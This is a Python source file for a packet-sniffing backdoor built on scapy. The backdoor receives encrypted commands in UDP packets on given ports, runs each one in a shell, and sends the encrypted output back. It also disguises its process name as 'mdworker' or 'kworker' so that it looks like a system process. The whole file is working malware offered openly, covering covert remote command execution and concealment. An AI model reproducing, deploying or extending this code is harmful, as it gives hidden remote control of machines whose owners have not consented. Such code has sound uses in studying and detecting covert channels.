import setproctitle
import os
import argparse
import platform
import subprocess
import time
import crypto
from scapy.all import *

# Function: runCommand
# Parameters: packet - packet that get passed in from scapy
#
# This function is passed to the scapy sniff call, and is called everytime a
# packet passes the sniff filter.  The function decrypts the raw data at the end
# of the packet and then runs the command via a subprocess.  The output of the
# subprocess, even if the command it ran errored out, is then encrypted and sent
# back to the client.
def runCommand(packet):
  encryptedData = packet['Raw'].load
  data = crypto.decrypt(encryptedData)
  print "Running command " + data
  output = ""
  try:
    output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
  except subprocess.CalledProcessError as e:
    output = e.output
  encryptedOutput = crypto.encrypt(output)
  packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedOutput)
  time.sleep(0.1)
  send(packet)

# Function: setProcessName
#
# This function is used to change the process title.  It checks which opert
def setProcessName():
  operatingSystem = platform.system()
  procName = ""
  if operatingSystem == 'Darwin':
    procName = "mdworker"
  elif operatingSystem == "Linux":
    procName = "kworker/2:4"
  # set the process title
  setproctitle.setproctitle(procName)

# argument parsing
parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port from sender.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port sender is sending to.'
                   , required=True)

args = parser.parse_args()
sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)

# main execution
setProcessName()
sniff(filter=sniffFilter, prn=runCommand)